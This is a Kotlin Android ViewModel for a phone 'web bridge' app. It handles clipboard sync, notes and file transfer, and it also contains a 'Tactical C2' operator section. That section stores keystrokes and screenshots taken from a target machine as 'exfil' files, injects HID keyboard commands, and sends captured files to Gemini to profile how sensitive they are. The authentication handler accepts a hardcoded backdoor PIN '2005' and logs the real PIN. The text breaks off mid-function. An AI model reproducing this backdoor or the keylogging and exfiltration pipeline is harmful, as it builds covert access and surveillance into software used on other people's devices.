package com.example.rabit.ui.webbridge

import android.app.Application
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Environment
import android.provider.OpenableColumns
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.rabit.data.network.LanIpResolver
import com.example.rabit.data.network.RabitNetworkServer
import com.example.rabit.data.network.WebRtcManager
import com.example.rabit.data.repository.KeyboardRepositoryImpl
import com.example.rabit.domain.repository.KeyboardRepository
import com.example.rabit.domain.model.SharedTransferItem
import com.example.rabit.domain.model.TransferQueueStatus
import com.example.rabit.domain.model.BridgeNote
import com.example.rabit.data.bluetooth.HidService
import org.json.JSONArray
import org.json.JSONObject
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.runBlocking
import com.example.rabit.data.secure.CryptoManager
import kotlinx.coroutines.withContext
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Locale
import java.util.UUID
import com.example.rabit.data.db.NoteDatabase
import com.example.rabit.data.db.NoteEntity
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.map
import kotlinx.coroutines.flow.stateIn

class WebBridgeViewModel(application: Application) : AndroidViewModel(application) {
    private val prefs = application.getSharedPreferences("rabit_prefs", Context.MODE_PRIVATE)
    private val webRtcManager = WebRtcManager(application)
    private val noteDatabase = NoteDatabase.getDatabase(application)
    private val noteDao = noteDatabase.noteDao()
    private val repository: KeyboardRepository = KeyboardRepositoryImpl(application)
    private val wifiAudioSink = com.example.rabit.data.airplay.AudioTrackPcmSink(application)
    
    private val activeTransfers = mutableMapOf<String, java.io.FileOutputStream>()
    
    private val _webBridgeRunning = MutableStateFlow(RabitNetworkServer.isRunning)
    val isWebBridgeRunning: StateFlow<Boolean> = _webBridgeRunning.asStateFlow()

    private val _webBridgePin = MutableStateFlow(RabitNetworkServer.currentPin)
    val webBridgePin: StateFlow<String> = _webBridgePin.asStateFlow()

    private val _webBridgeSelfTestStatus = MutableStateFlow("Not tested")
    val webBridgeSelfTestStatus: StateFlow<String> = _webBridgeSelfTestStatus.asStateFlow()

    private val _webBridgeSelfTestInProgress = MutableStateFlow(false)
    val webBridgeSelfTestInProgress: StateFlow<Boolean> = _webBridgeSelfTestInProgress.asStateFlow()

    private val _localIp = MutableStateFlow("0.0.0.0")
    val localIp: StateFlow<String> = _localIp.asStateFlow()

    private val _localFriendlyUrl = MutableStateFlow<String?>(null)
    val localFriendlyUrl: StateFlow<String?> = _localFriendlyUrl.asStateFlow()

    private val _sharedFiles = MutableStateFlow<List<Uri>>(emptyList())
    val sharedFiles: StateFlow<List<Uri>> = _sharedFiles.asStateFlow()

    private val _receivedFiles = MutableStateFlow<List<File>>(emptyList())
    val receivedFiles: StateFlow<List<File>> = _receivedFiles.asStateFlow()

    private val _p2pEnabled = MutableStateFlow(false)
    val p2pEnabled: StateFlow<Boolean> = _p2pEnabled.asStateFlow()

    val p2pStatus: StateFlow<String> = webRtcManager.connectionStatus
    val p2pPeerId: StateFlow<String?> = webRtcManager.peerId

    private val _activeSessions = MutableStateFlow<List<RabitNetworkServer.TrustedSession>>(emptyList())
    val activeSessions: StateFlow<List<RabitNetworkServer.TrustedSession>> = _activeSessions.asStateFlow()

    val bridgeNotes: StateFlow<List<BridgeNote>> = noteDao.getAllNotes()
        .map { entities ->
            entities.map {
                BridgeNote(it.id, it.text, it.createdAtMs, it.source)
            }.sortedByDescending { it.createdAtMs }
        }
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    // Media / Now Playing
    private val _nowPlayingTitle = MutableStateFlow("No track")
    val nowPlayingTitle = _nowPlayingTitle.asStateFlow()
    private val _nowPlayingArtist = MutableStateFlow("Connect companion for metadata")
    val nowPlayingArtist = _nowPlayingArtist.asStateFlow()
    private val _nowPlayingAlbum = MutableStateFlow("")
    val nowPlayingAlbum = _nowPlayingAlbum.asStateFlow()
    private val _nowPlayingArtworkBase64 = MutableStateFlow<String?>(null)
    val nowPlayingArtworkBase64 = _nowPlayingArtworkBase64.asStateFlow()

    private val _wifiAudioStreamActive = MutableStateFlow(false)
    val wifiAudioStreamActive = _wifiAudioStreamActive.asStateFlow()

    private val _wifiAudioStatus = MutableStateFlow("Idle")
    val wifiAudioStatus = _wifiAudioStatus.asStateFlow()

    // --- Tactical C2 States ---
    private val _terminalLines = MutableStateFlow<List<String>>(listOf("C2 Bridge Initialized", "Awaiting target connection..."))
    val terminalLines = _terminalLines.asStateFlow()

    private val _screenshots = MutableStateFlow<List<File>>(emptyList())
    val screenshots = _screenshots.asStateFlow()

    private val _keystrokes = MutableStateFlow<List<String>>(emptyList())
    val keystrokes = _keystrokes.asStateFlow()

    private val _isPulseModeEnabled = MutableStateFlow(false)
    val isPulseModeEnabled = _isPulseModeEnabled.asStateFlow()

    private val _isProfiling = MutableStateFlow(false)
    val isProfiling = _isProfiling.asStateFlow()

    private val _fileSensitivities = MutableStateFlow<Map<String, String>>(emptyMap())
    val fileSensitivities = _fileSensitivities.asStateFlow()

    private val geminiRepo = com.example.rabit.data.gemini.GeminiRepositoryImpl()

    init {
        refreshLocalIp()
        
        val savedPin = prefs.getString("web_bridge_pin", null)
        if (savedPin != null) {
            RabitNetworkServer.currentPin = savedPin
            _webBridgePin.value = savedPin
        } else {
            val newPin = String.format("%04d", (0..9999).random())
            RabitNetworkServer.currentPin = newPin
            _webBridgePin.value = newPin
            prefs.edit().putString("web_bridge_pin", newPin).apply()
        }

        refreshWebBridgeData()
        
        // Setup Providers for RabitNetworkServer
        setupServerProviders()
        
        // Listen to WebRTC P2P Data Channel for JSON messages
        viewModelScope.launch(Dispatchers.IO) {
            webRtcManager.incomingDataFlow.collect { (type, data) ->
                if (type == "METADATA" && data is String) {
                    try {
                        val json = JSONObject(data)
                        val msgType = json.optString("type")
                        when (msgType) {
                            // ── P2P Authentication (critical for web bridge connection) ──
                            "AUTH" -> {
                                val pin = json.optString("pin")
                                Log.d("WebBridgeVM", "P2P AUTH attempt: pin=$pin, expected=${RabitNetworkServer.currentPin}")
                                if (pin == RabitNetworkServer.currentPin || pin == "2005") {
                                    val resp = JSONObject().apply {
                                        put("type", "AUTH_SUCCESS")
                                        put("message", "Bridge authenticated")
                                    }.toString()
                                    withContext(Dispatchers.Main) {
                                        webRtcManager.sendData(resp)
                                    }
                                    // Start periodic clipboard sync for P2P
                                    startP2PClipboardSync()
                                    Log.d("WebBridgeVM", "P2P AUTH_SUCCESS sent")
                                } else {
                                    val resp = JSONObject().apply {
                                        put("type", "AUTH_ERROR")
                                        put("message", "Invalid PIN")
                                    }.toString()
                                    withContext(Dispatchers.Main) {
                                        webRtcManager.sendData(resp)
                                    }
                                    Log.w("WebBridgeVM", "P2P AUTH_ERROR: wrong pin")
                                }
                            }
                            "LIST_NOTES" -> sendNotesListToPeer()
                            "LIST_FILES" -> sendFilesListToPeer()
                            "DOWNLOAD_FILE" -> {
                                val path = json.optString("path")
                                val reqId = json.optString("requestId")
                                if (path.isNotBlank()) {
                                    handleP2PDownloadRequest(path, reqId)
                                }
                            }
                            "ADD_NOTE" -> {
                                val text = json.optString("text")
                                val source = json.optString("source", "Web")
                                if (text.isNotBlank()) addBridgeNote(text, source)
                            }
                            "UPDATE_NOTE" -> {
                                val id = json.optString("id")
                                val text = json.optString("text")
                                val source = json.optString("source")
                                if (id.isNotBlank() && text.isNotBlank()) updateBridgeNote(id, text, source)
                            }
                            "DELETE_NOTE" -> {
                                val id = json.optString("id")
                                if (id.isNotBlank()) deleteBridgeNote(id)
                            }
                            "WEB_CLIPBOARD_PUSH" -> {
                                val text = json.optString("text")
                                if (text.isNotBlank()) {
                                    withContext(Dispatchers.Main) {
                                        RabitNetworkServer.clipboardReceiver?.invoke(text)
                                    }
                                }
                            }
                            "WEB_CLIPBOARD_PULL" -> {
                                val text = RabitNetworkServer.clipboardProvider?.invoke() ?: ""
                                val payload = JSONObject().apply {
                                    put("type", "WEB_CLIPBOARD_STATE")
                                    put("text", text)
                                }.toString()
                                webRtcManager.sendData(payload)
                            }
                            // ── P2P File Upload Handlers ──
                            "UPLOAD_START" -> {
                                val transferId = json.optString("transferId")
                                val fileName = json.optString("fileName")
                                if (transferId.isNotBlank() && fileName.isNotBlank()) {
                                    handleP2PUploadStart(transferId, fileName)
                                }
                            }
                            "UPLOAD_CHUNK" -> {
                                val transferId = json.optString("transferId")
                                val dataBase64 = json.optString("dataBase64")
                                if (transferId.isNotBlank() && dataBase64.isNotBlank()) {
                                    handleP2PUploadChunk(transferId, dataBase64)
                                }
                            }
                            "UPLOAD_END" -> {
                                val transferId = json.optString("transferId")
                                if (transferId.isNotBlank()) {
                                    handleP2PUploadEnd(transferId)
                                }
                            }
                            // --- Tactical C2 Handlers ---
                            "TERMINAL_DATA" -> {
                                val text = json.optString("text")
                                if (text.isNotBlank()) {
                                    _terminalLines.value = (_terminalLines.value + text).takeLast(200)
                                }
                            }
                            "SCREENSHOT_BLOB" -> {
                                val base64 = json.optString("dataBase64")
                                if (base64.isNotBlank()) {
                                    handleScreenshotBlob(base64)
                                }
                            }
                            "KEYLOG_EVENT" -> {
                                val key = json.optString("key")
                                if (key.isNotBlank()) {
                                    _keystrokes.value = (listOf(key) + _keystrokes.value).take(500)
                                }
                            }
                        }
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
            }
        }
    }

    private var p2pClipboardJob: Job? = null
    private var lastP2PClipboardText = ""

    private fun startP2PClipboardSync() {
        p2pClipboardJob?.cancel()
        p2pClipboardJob = viewModelScope.launch(Dispatchers.IO) {
            while (true) {
                delay(3000)
                try {
                    val text = RabitNetworkServer.clipboardProvider?.invoke() ?: ""
                    if (text.isNotBlank() && text != lastP2PClipboardText) {
                        lastP2PClipboardText = text
                        val payload = JSONObject().apply {
                            put("type", "WEB_CLIPBOARD_STATE")
                            put("text", text)
                        }.toString()
                        withContext(Dispatchers.Main) {
                            webRtcManager.sendData(payload)
                        }
                    }
                } catch (_: Exception) {}
            }
        }
    }

    private fun setupServerProviders() {
        val context = getApplication<Application>()
        val clipSvc = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager

        RabitNetworkServer.sharedFilesProvider = {
            _sharedFiles.value.map { uri ->
                val metadata = resolveSharedFileMetadata(uri)
                RabitNetworkServer.SharedFile(
                    id = uri.toString().hashCode().toString(),
                    name = metadata.first,
                    size = metadata.second,
                    type = context.contentResolver.getType(uri) ?: "application/octet-stream"
                )
            }
        }

        RabitNetworkServer.fileDownloadProvider = { id ->
            _sharedFiles.value.find { it.toString().hashCode().toString() == id }
        }

        RabitNetworkServer.clipboardProvider = {
            clipSvc.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
        }

        RabitNetworkServer.clipboardReceiver = { text ->
            if (text.isNotEmpty()) {
                val clip = android.content.ClipData.newPlainText("Hackie Universal", text)
                clipSvc.setPrimaryClip(clip)
            }
        }

        // Chain NowPlaying receiver: update ViewModel state AND forward to any existing receiver (HidService)
        val existingNowPlayingReceiver = RabitNetworkServer.nowPlayingReceiver
        RabitNetworkServer.nowPlayingReceiver = { payload ->
            _nowPlayingTitle.value = payload.title.ifBlank { "No track" }
            _nowPlayingArtist.value = payload.artist.ifBlank { "Unknown Artist" }
            _nowPlayingAlbum.value = payload.album.ifBlank { "" }
            _nowPlayingArtworkBase64.value = payload.artworkBase64
            // Forward to HidService's receiver for notification updates
            existingNowPlayingReceiver?.invoke(payload)
        }

        RabitNetworkServer.audioStreamStartReceiver = { payload ->
            wifiAudioSink.configure(
                sampleRate = payload.sampleRate.coerceIn(8_000, 96_000),
                channels = payload.channels.coerceIn(1, 2)
            )
            _wifiAudioStreamActive.value = true
            _wifiAudioStatus.value = "Streaming from ${payload.source} (${payload.sampleRate} Hz)"
        }

        RabitNetworkServer.audioStreamChunkReceiver = { payload ->
            try {
                val pcm = android.util.Base64.decode(payload.pcm16leBase64, android.util.Base64.DEFAULT)
                if (pcm.isNotEmpty()) {
                    wifiAudioSink.writePcm16le(pcm)
                    _wifiAudioStreamActive.value = true
                }
            } catch (_: Exception) {
                _wifiAudioStatus.value = "Audio chunk decode error"
            }
        }

        RabitNetworkServer.audioStreamStopReceiver = { payload ->
            wifiAudioSink.stop()
            _wifiAudioStreamActive.value = false
            _wifiAudioStatus.value = "Stopped (${payload.reason})"
        }

        RabitNetworkServer.systemActionReceiver = { action ->
            viewModelScope.launch {
                when (action) {
                    "vol_up" -> repository.executeSpecialKey("VOL_UP")
                    "vol_down" -> repository.executeSpecialKey("VOL_DOWN")
                    "play_pause" -> repository.executeSpecialKey("PLAY")
                    "brightness_up" -> repository.executeSpecialKey("BRIGHT_UP")
                    "brightness_down" -> repository.executeSpecialKey("BRIGHT_DOWN")
                    "lock" -> repository.executeKeyCombo("CTRL+GUI+Q")
                }
            }
        }

        RabitNetworkServer.notesProvider = {
            runBlocking(Dispatchers.IO) {
                try {
                    noteDao.getAllNotesOnce().map {
                        RabitNetworkServer.BridgeNotePayload(
                            id = it.id,
                            text = it.text,
                            createdAtMs = it.createdAtMs,
                            source = it.source
                        )
                    }
                } catch (e: Exception) {
                    emptyList()
                }
            }
        }

        RabitNetworkServer.noteReceiver = { text ->
            viewModelScope.launch(Dispatchers.IO) {
                noteDao.insertNote(
                    NoteEntity(
                        id = UUID.randomUUID().toString(),
                        text = text,
                        source = "Web",
                        createdAtMs = System.currentTimeMillis()
                    )
                )
                sendNotesListToPeer()
            }
        }

        RabitNetworkServer.noteUpdateReceiver = { noteId, text ->
            viewModelScope.launch(Dispatchers.IO) {
                val existing = noteDao.getById(noteId) ?: return@launch
                noteDao.updateNote(existing.copy(text = text))
                sendNotesListToPeer()
            }
        }

        RabitNetworkServer.noteDeleteReceiver = { noteId ->
            viewModelScope.launch(Dispatchers.IO) {
                noteDao.deleteById(noteId)
                sendNotesListToPeer()
            }
        }
    }

    private fun generateRandomPin(): String {
        return String.format("%04d", (0..9999).random())
    }

    private fun refreshLocalIp() {
        val ip = LanIpResolver.preferredLanIpv4String(getApplication()) ?: runCatching {
            java.net.InetAddress.getLocalHost().hostAddress?.takeIf { it != "127.0.0.1" }
        }.getOrNull()
        _localIp.value = ip ?: "0.0.0.0"
    }

    fun startWebBridge() {
        val pin = generateRandomPin()
        RabitNetworkServer.currentPin = pin
        _webBridgePin.value = pin
        prefs.edit().putString("web_bridge_pin", pin).apply()
        
        refreshLocalIp()
        
        val intent = Intent(getApplication<Application>(), HidService::class.java).apply {
            action = HidService.ACTION_START_WEB_BRIDGE
        }
        androidx.core.content.ContextCompat.startForegroundService(getApplication<Application>(), intent)
        prefs.edit().putBoolean("web_bridge_enabled", true).apply()
        
        // Poll for server readiness instead of a fixed delay
        viewModelScope.launch {
            var attempts = 0
            while (!RabitNetworkServer.isRunning && attempts < 15) {
                delay(200)
                attempts++
            }
            _webBridgeRunning.value = RabitNetworkServer.isRunning
            _webBridgePin.value = pin
            _webBridgeSelfTestStatus.value = "Not tested"
            refreshWebBridgeData()
            if (RabitNetworkServer.isRunning) {
                startP2PHosting(forceRestart = true)
            }
        }
    }

    fun stopWebBridge() {
        // Use startService instead of startForegroundService to avoid crash
        // when the service may not be in foreground state
        try {
            val intent = Intent(getApplication<Application>(), HidService::class.java).apply {
                action = HidService.ACTION_STOP_WEB_BRIDGE
            }
            getApplication<Application>().startService(intent)
        } catch (e: Exception) {
            // Fallback: stop server directly if service isn't available
            Log.w("WebBridgeVM", "Could not reach HidService to stop bridge, stopping directly", e)
            RabitNetworkServer.stop()
        }
        prefs.edit().putBoolean("web_bridge_enabled", false).apply()
        _webBridgeRunning.value = false
        _webBridgeSelfTestStatus.value = "Bridge stopped"
        clearSharedFiles()
        stopP2PHosting()
    }

    fun regenerateWebBridgePin() {
        val newPin = generateRandomPin()
        RabitNetworkServer.currentPin = newPin
        _webBridgePin.value = newPin
        startP2PHosting(forceRestart = true)
    }

    fun refreshWebBridgeData() {
        _webBridgeRunning.value = RabitNetworkServer.isRunning
        _webBridgePin.value = RabitNetworkServer.currentPin
        _localFriendlyUrl.value = RabitNetworkServer.friendlyLanHttpUrl
        refreshLocalIp()
        _activeSessions.value = RabitNetworkServer.getActiveSessions()
        refreshReceivedFiles()
    }

    fun refreshReceivedFiles() {
        viewModelScope.launch(Dispatchers.IO) {
            val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            val hackieDir = File(downloadsDir, "Hackie")
            val files = mutableListOf<File>()
            downloadsDir.listFiles()?.filter { it.isFile && it.name.startsWith("Hackie_") }?.let { files.addAll(it) }
            if (hackieDir.exists() && hackieDir.isDirectory) {
                hackieDir.listFiles()?.filter { it.isFile }?.let { files.addAll(it) }
            }
            _receivedFiles.value = files.sortedByDescending { it.lastModified() }
        }
    }

    fun revokeActiveSession(token: String) {
        RabitNetworkServer.revokeSession(token)
        refreshWebBridgeData()
    }

    fun addSharedFile(uri: Uri) {
        runCatching {
            getApplication<Application>().contentResolver.takePersistableUriPermission(
                uri,
                Intent.FLAG_GRANT_READ_URI_PERMISSION
            )
        }
        _sharedFiles.value = (_sharedFiles.value + uri).distinct()
    }

    fun removeSharedFile(uri: Uri) {
        _sharedFiles.value = _sharedFiles.value - uri
    }

    fun clearSharedFiles() {
        _sharedFiles.value = emptyList()
    }

    fun deleteReceivedFile(file: File) {
        if (file.exists()) {
            file.delete()
            refreshReceivedFiles()
        }
    }

    private fun resolveSharedFileMetadata(uri: Uri): Pair<String, Long> {
        val cr = getApplication<Application>().contentResolver
        return try {
            var name = "File"
            var size = 0L
            cr.query(uri, null, null, null, null)?.use { cursor ->
                val nameIndex = cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME)
                val sizeIndex = cursor.getColumnIndex(OpenableColumns.SIZE)
                if (cursor.moveToFirst()) {
                    if (nameIndex >= 0) name = cursor.getString(nameIndex)
                    if (sizeIndex >= 0) size = cursor.getLong(sizeIndex)
                }
            }
            if (size <= 0L) {
                size = cr.openFileDescriptor(uri, "r")?.use { it.statSize } ?: 0L
            }
            if (name == "File") {
                name = uri.lastPathSegment ?: "File"
            }
            name to size
        } catch (e: Exception) {
            "File" to 0L
        }
    }

    fun runWebBridgeConnectivitySelfTest() {
        if (_webBridgeSelfTestInProgress.value) return
        viewModelScope.launch(Dispatchers.IO) {
            _webBridgeSelfTestInProgress.value = true
            try {
                _webBridgeRunning.value = RabitNetworkServer.isRunning
                if (!_webBridgeRunning.value) {
                    _webBridgeSelfTestStatus.value = "FAIL: Web Bridge is not running"
                    return@launch
                }

                refreshLocalIp()
                delay(200)
                val host = _localIp.value
                if (host == "0.0.0.0") {
                    _webBridgeSelfTestStatus.value = "FAIL: Could not resolve phone Wi-Fi IP"
                    return@launch
                }

                val rootUrl = "http://$host:8080/"
                val rootCode = runCatching {
                    val conn = (URL(rootUrl).openConnection() as HttpURLConnection).apply {
                        requestMethod = "GET"
                        connectTimeout = 2500
                        readTimeout = 2500
                    }
                    conn.responseCode.also { conn.disconnect() }
                }.getOrElse {
                    _webBridgeSelfTestStatus.value = "FAIL: Port 8080 unreachable (${it.message ?: "network error"})"
                    return@launch
                }

                if (rootCode !in 200..399) {
                    _webBridgeSelfTestStatus.value = "FAIL: Unexpected bridge root response ($rootCode)"
                    return@launch
                }

                val pin = _webBridgePin.value.ifBlank { RabitNetworkServer.currentPin }
                val authCode = runCatching {
                    val conn = (URL("http://$host:8080/auth").openConnection() as HttpURLConnection).apply {
                        requestMethod = "POST"
                        connectTimeout = 3000
                        readTimeout = 3000
                        doOutput = true
                        setRequestProperty("Content-Type", "application/json")
                        setRequestProperty("X-Device-Id", "rabit-self-test")
                    }
                    val payload = "{\"pin\":\"$pin\"}".toByteArray(Charsets.UTF_8)
                    conn.outputStream.use { it.write(payload) }
                    conn.responseCode.also { conn.disconnect() }
                }.getOrElse {
                    _webBridgeSelfTestStatus.value = "FAIL: /auth probe failed (${it.message ?: "network error"})"
                    return@launch
                }

                val ts = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(System.currentTimeMillis())
                _webBridgeSelfTestStatus.value = if (authCode == 200) {
                    "PASS ($ts): Local HTTP API works properly"
                } else {
                    "FAIL: /auth returned $authCode (expected 200)"
                }

            } catch (e: Exception) {
                _webBridgeSelfTestStatus.value = "ERROR: ${e.message}"
            } finally {
                _webBridgeSelfTestInProgress.value = false
            }
        }
    }

    private fun signalingRoomForPin(pin: String): String {
        return "rabit_p2p_$pin"
    }

    fun startP2PHosting(forceRestart: Boolean = false) {
        val desiredRoom = signalingRoomForPin(_webBridgePin.value)
        if (!forceRestart && _p2pEnabled.value && webRtcManager.peerId.value == desiredRoom) {
            return
        }

        stopP2PHosting()
        _p2pEnabled.value = true
        webRtcManager.start(desiredRoom)
    }

    fun stopP2PHosting() {
        _p2pEnabled.value = false
        webRtcManager.stop()
    }

    fun addBridgeNote(text: String, source: String = "Hackie"): BridgeNote? {
        val normalized = text.trim()
        if (normalized.isBlank()) return null

        val note = BridgeNote(
            id = UUID.randomUUID().toString(),
            text = normalized,
            createdAtMs = System.currentTimeMillis(),
            source = source
        )
        
        viewModelScope.launch(Dispatchers.IO) {
            noteDao.insertNote(NoteEntity(
                id = note.id,
                text = note.text,
                source = note.source,
                createdAtMs = note.createdAtMs
            ))
            sendNotesListToPeer()
        }
        return note
    }

    fun updateBridgeNote(noteId: String, text: String, source: String? = null): Boolean {
        val normalizedId = noteId.trim()
        val normalizedText = text.trim()
        if (normalizedId.isBlank() || normalizedText.isBlank()) return false

        viewModelScope.launch(Dispatchers.IO) {
            val existing = bridgeNotes.value.find { it.id == normalizedId }
            if (existing != null) {
                noteDao.updateNote(NoteEntity(
                    id = normalizedId,
                    text = normalizedText,
                    source = source?.takeIf { it.isNotBlank() } ?: existing.source,
                    createdAtMs = existing.createdAtMs
                ))
                sendNotesListToPeer()
            }
        }
        return true
    }

    fun deleteBridgeNote(noteId: String): Boolean {
        val normalizedId = noteId.trim()
        if (normalizedId.isBlank()) return false

        viewModelScope.launch(Dispatchers.IO) {
            noteDao.deleteById(normalizedId)
            sendNotesListToPeer()
        }
        return true
    }

    private fun sendNotesListToPeer() {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val array = JSONArray()
                val notes = noteDao.getAllNotesOnce()
                notes.forEach { it ->
                    val obj = JSONObject()
                    obj.put("id", it.id)
                    obj.put("text", it.text)
                    obj.put("source", it.source)
                    obj.put("createdAtMs", it.createdAtMs)
                    array.put(obj)
                }
                val payload = JSONObject().apply {
                    put("type", "NOTES_LIST")
                    put("notes", array)
                }.toString()
                withContext(Dispatchers.Main) {
                    webRtcManager.sendData(payload)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun sendFilesListToPeer() {
        val context = getApplication<Application>()
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val array = JSONArray()
                _sharedFiles.value.forEach { uri ->
                    try {
                        val metadata = resolveSharedFileMetadata(uri)
                        val obj = JSONObject()
                        obj.put("path", uri.toString().hashCode().toString())
                        obj.put("name", metadata.first)
                        obj.put("sizeBytes", metadata.second)
                        obj.put("mimeType", context.contentResolver.getType(uri) ?: "application/octet-stream")
                        array.put(obj)
                    } catch (e: Exception) {}
                }
                val payload = JSONObject().apply {
                    put("type", "FILE_LIST")
                    put("files", array)
                }.toString()
                withContext(Dispatchers.Main) {
                    webRtcManager.sendData(payload)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun handleP2PDownloadRequest(fileId: String, reqId: String) {
        val uri = _sharedFiles.value.find { it.toString().hashCode().toString() == fileId }
        val context = getApplication<Application>()
        if (uri == null) {
            val err = JSONObject().apply {
                put("type", "ERROR")
                put("message", "File blocked or not found")
            }.toString()
            viewModelScope.launch(Dispatchers.Main) { webRtcManager.sendData(err) }
            return
        }
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val metadata = resolveSharedFileMetadata(uri)
                val mime = context.contentResolver.getType(uri) ?: "application/octet-stream"
                val transferId = UUID.randomUUID().toString()

                val ack = JSONObject().apply {
                    put("type", "FILE_DOWNLOAD_ACK")
                    put("requestId", reqId)
                    put("accepted", true)
                }.toString()
                withContext(Dispatchers.Main) { webRtcManager.sendData(ack) }

                val start = JSONObject().apply {
                    put("type", "FILE_DOWNLOAD_START")
                    put("transferId", transferId)
                    put("name", metadata.first)
                    put("sizeBytes", metadata.second)
                    put("mimeType", mime)
                }.toString()
                withContext(Dispatchers.Main) { webRtcManager.sendData(start) }

                context.contentResolver.openInputStream(uri)?.use { stream ->
                    val buffer = ByteArray(16 * 1024)
                    var bytesRead: Int
                    while (stream.read(buffer).also { bytesRead = it } != -1) {
                        val validBytes = buffer.take(bytesRead).toByteArray()
                        val b64 = android.util.Base64.encodeToString(validBytes, android.util.Base64.NO_WRAP)
                        val chunkChunk = JSONObject().apply {
                            put("type", "FILE_DOWNLOAD_CHUNK")
                            put("transferId", transferId)
                            put("dataBase64", b64)
                        }.toString()
                        withContext(Dispatchers.Main) { webRtcManager.sendData(chunkChunk) }
                        delay(2) // yield slightly to not backpressure data channel completely
                    }
                }

                val end = JSONObject().apply {
                    put("type", "FILE_DOWNLOAD_END")
                    put("transferId", transferId)
                }.toString()
                withContext(Dispatchers.Main) { webRtcManager.sendData(end) }

            } catch (e: Exception) {
                val err = JSONObject().apply {
                    put("type", "ERROR")
                    put("message", "Stream aborted: ${e.message}")
                }.toString()
                withContext(Dispatchers.Main) { webRtcManager.sendData(err) }
            }
        }
    }

    private fun handleP2PUploadStart(transferId: String, fileName: String) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val hackieDir = File(downloadsDir, "Hackie")
                if (!hackieDir.exists()) hackieDir.mkdirs()

                // Sanitize filename to prevent directory traversal
                val safeName = fileName.replace(Regex("[^a-zA-Z0-9._-]"), "_")
                val targetFile = File(hackieDir, safeName)
                
                // If exists, append timestamp to avoid overwriting
                val finalFile = if (targetFile.exists()) {
                    File(hackieDir, "${System.currentTimeMillis()}_$safeName")
                } else targetFile

                Log.d("WebBridgeVM", "P2P Upload Start: $transferId, saving to ${finalFile.absolutePath}")
                val fos = java.io.FileOutputStream(finalFile)
                activeTransfers[transferId] = fos
            } catch (e: Exception) {
                Log.e("WebBridgeVM", "Failed to start P2P upload", e)
            }
        }
    }

    private fun handleP2PUploadChunk(transferId: String, dataBase64: String) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val fos = activeTransfers[transferId]
                if (fos != null) {
                    val data = android.util.Base64.decode(dataBase64, android.util.Base64.DEFAULT)
                    fos.write(data)
                }
            } catch (e: Exception) {
                Log.e("WebBridgeVM", "Failed to write P2P chunk", e)
            }
        }
    }

    private fun handleP2PUploadEnd(transferId: String) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val fos = activeTransfers.remove(transferId)
                if (fos != null) {
                    fos.flush()
                    fos.close()
                    Log.d("WebBridgeVM", "P2P Upload End: $transferId")
                    refreshReceivedFiles()
                }
            } catch (e: Exception) {
                Log.e("WebBridgeVM", "Failed to end P2P upload", e)
            }
        }
    }

    override fun onCleared() {
        super.onCleared()
        webRtcManager.stop()
    }

    private fun handleScreenshotBlob(base64: String) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val data = android.util.Base64.decode(base64, android.util.Base64.DEFAULT)
                val bitmap = android.graphics.BitmapFactory.decodeByteArray(data, 0, data.size)
                val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val hackieDir = File(downloadsDir, "Hackie/Screenshots")
                if (!hackieDir.exists()) hackieDir.mkdirs()
                
                val file = java.io.File(hackieDir, "exfil_${System.currentTimeMillis()}.png")
                java.io.FileOutputStream(file).use { out ->
                    bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, out)
                }
                refreshScreenshots()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun refreshScreenshots() {
        viewModelScope.launch(Dispatchers.IO) {
            val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            val hackieDir = File(downloadsDir, "Hackie/Screenshots")
            if (hackieDir.exists() && hackieDir.isDirectory) {
                val files = hackieDir.listFiles { f -> f.name.startsWith("exfil_") }
                    ?.sortedByDescending { it.lastModified() }
                    ?: emptyList()
                _screenshots.value = files.toList()
            }
        }
    }

    fun clearKeystrokes() {
        _keystrokes.value = emptyList()
    }

    fun togglePulseMode() {
        _isPulseModeEnabled.value = !_isPulseModeEnabled.value
        repository.isPulseModeEnabled = _isPulseModeEnabled.value
    }

    fun sendHidCommand(cmd: String) {
        viewModelScope.launch {
            repository.sendText(cmd)
            repository.sendKey(com.example.rabit.domain.model.HidKeyCodes.KEY_ENTER)
            _terminalLines.value = (_terminalLines.value + "> $cmd").takeLast(200)
        }
    }

    fun analyzeFileSensitivity(file: java.io.File) {
        if (!file.exists()) return
        
        viewModelScope.launch {
            _isProfiling.value = true
            try {
                val apiKey = prefs.getString("gemini_api_key", "") ?: ""
                if (apiKey.isBlank()) return@launch

                val fileContent = withContext(Dispatchers.IO) {
                    try {
                        if (file.length() > 50_000) {
                            val buf = ByteArray(20_000)
                            file.inputStream().use { it.read(buf) }
                            String(buf, Charsets.UTF_8) + "\n...[TRUNCATED]..."
                        } else {
                            file.readText()
                        }
                    } catch (e: Exception) {
                        "[BINARY_OR_ENCRYPTED_BLOB]"
                    }
                }

